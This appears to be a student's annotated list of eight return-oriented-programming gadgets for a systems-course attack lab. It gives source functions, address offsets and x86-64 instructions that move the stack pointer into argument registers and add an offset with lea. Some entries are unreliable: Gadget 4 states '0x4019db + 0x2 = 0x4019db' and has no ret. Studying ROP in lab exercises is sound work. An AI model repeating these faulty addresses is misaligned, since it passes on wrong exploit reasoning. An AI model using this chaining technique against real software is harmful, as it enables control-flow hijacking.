// Gadget 1 : From addval_190 (0x401a03+0x3 = 0x401a06)
movq %rsp,%rax 
ret
// Gadget 2 : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)
movq %rax,%rdi
nop
ret
// Gadget 3 : From addval_219 (0x4019a7 + 0x4 = 0x4019ab)
popq %rax 
nop 
ret
// Gadget 4 : From getval_481 (0x4019db + 0x2 = 0x4019db)
movl %eax,%edx
// Gadget 5 : From getval_159 (0x401a33 + 0x1 = 0x401a34)
movl %edx,%ecx  
cmpb %cl,%cl // Can skip this instrcution, cause no jmp instruction after this
ret
// Gadget 6 : From addval_436 (0x401a11 + 0x2 = 0x401a13)
movl %ecx, %esi
nop 
nop 
ret
// Gadget 7 : From the function of add_xy(0x4019d6)
lea  (%rdi,%rsi,1),%rax
ret
// Gadget 8(same as gadget2) : From setval_426 (0x4019c3 + 0x2 = 0x4019c5)
movq %rax,%rdi 
nop 
ret